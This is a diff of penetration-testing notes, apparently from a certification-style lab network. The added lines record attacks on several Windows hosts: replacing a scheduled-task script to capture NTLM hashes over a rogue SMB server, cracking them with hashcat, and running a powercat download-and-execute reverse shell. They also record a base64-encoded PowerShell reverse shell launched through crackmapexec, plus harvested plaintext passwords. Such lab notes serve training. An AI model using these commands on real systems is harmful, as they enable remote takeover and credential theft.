@@ -385,7 +385,7 @@ password: FrogColossusMad1
 database: master
 
 Get-Childitem -recurse -filter "TODO.txt" -ErrorAction SilentlyContinue
-# get creds for ARCHIVE machine
+# get creds for ARCHIVE machine (12)
 admin:Complex__1__Password!
 ```
 
@@ -429,13 +429,27 @@ crackmapexec smb 10.20.84.111 -u backup_service -p 'It4Server' -X "powershell.ex
 Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue
 Get-Childitem -recurse -filter "local.txt" -ErrorAction SilentlyContinue
 
-# post enum
+# post enum - we see a scheduled task that connects to an smb server. we can modify it, so we can replace this with our smb server to capture a user and NTLM hash
+# NOTE: the creds are used on .250
 Get-ScheduledTask
 # find a C:\setup\setup.ps1
-# contains
-pw: #NexusRoleLintel835
-dir \\client01.skylark.com\C$
-\\192.168.45.229\smb\test.txt
+# contains pw: #NexusRoleLintel835 (dont need this though)
+
+# create a file setup.ps1 on kali that contains
+dir \\192.168.45.229\smb
+# copy it to the
+cd C:\setup
+mv setup.ps1 setup.ps1.bak
+iwr -uri http://192.168.45.229/setup.ps1 -Outfile setup.ps1
+
+# catch the NTLM hash with our smb connection
+sudo impacket-smbserver -smb2support smb smb
+
+# paste the entire thing into a file to crack
+helpdesk_setup::SKYLARK:aaaaaaaaaaaaaaaa:259b6b083297b7777cd6713b2766a120:01010000000000008032397ec139da01bb964f7b83ac456e000000000100100045004b005700580061004400680065000300100045004b00570058006100440068006500020010004500420063004c005200470075004800040010004500420063004c005200470075004800070008008032397ec139da0106000400020000000800300030000000000000000000000000200000cafcc465713c4f92e202c5796c5cad4b07db33d76f429e7c0ed99f71ed5eae4d0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200320039000000000000000000
+
+# obtain password helpdesk_setup:Tuna6Helper
+hashcat -m 5600 helpdesk.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
 .11
@@ -447,6 +461,27 @@ ftp_jp:~be<3@6fe1Z:2e8
 # creds for partner portal (220)
 
 powershell.exe -c 'Get-ChildItem -Path C:\ -Filter local.txt -Recurse -ErrorAction SilentlyContinue -Force'
+```
+
+.12 (archive) (10.10.84.12)
+```bash
+# obtained creds: admin:Complex__1__Password!
+nmap -Pn 10.10.84.12
+
+# ssh does not work
+ssh admin@10.10.84.12
+
+# domain admin creds do not work, neither does admin
+crackmapexec smb 10.10.84.12 -u admin -p "Complex__1__Password\!" --continue-on-success
+
+# use admin creds on web page
+http://10.10.84.12:8080/files/
+
+# linux or windows? windows
+nmap -sT -A -p 8080 -Pn 10.10.84.12
+sudo nmap 10.10.84.12 --osscan-guess -Pn
+
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.229/powercat.ps1');powercat -c 192.168.45.229 -p 1234 -e cmd"
 ```
 
 .13 - mail server use for phishing
@@ -698,4 +733,25 @@ grep --color=auto -rnw -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev
 grep --color=auto -rnw '/' -iIe "kiosk" --color=always 2>/dev/null
 
 find . -type f -iname '*.pdf'
+```
+
+.250 (10.10.84.250) (DC?)
+```bash
+# don't need these creds as we can use domain admin to login
+# Use creds: helpdesk_setup:Tuna6Helper
+
+nmap 10.10.84.250
+
+crackmapexec smb 10.10.84.250 -u backup_service -p It4Server --continue-on-success
+crackmapexec smb 10.10.84.250 -u backup_service -p 'It4Server' -X "whoami"
+crackmapexec smb 10.10.84.250 -u backup_service -p 'It4Server' -X "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA5ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+Get-Childitem -recurse -filter "proof.txt" -ErrorAction SilentlyContinue
+
+# find a C:\credentials.txt
+Local Admin Passwords:
+
+- PARIS: MusingExtraCounty98
+- SYDNEY: DowntownAbbey1923
+
 ```
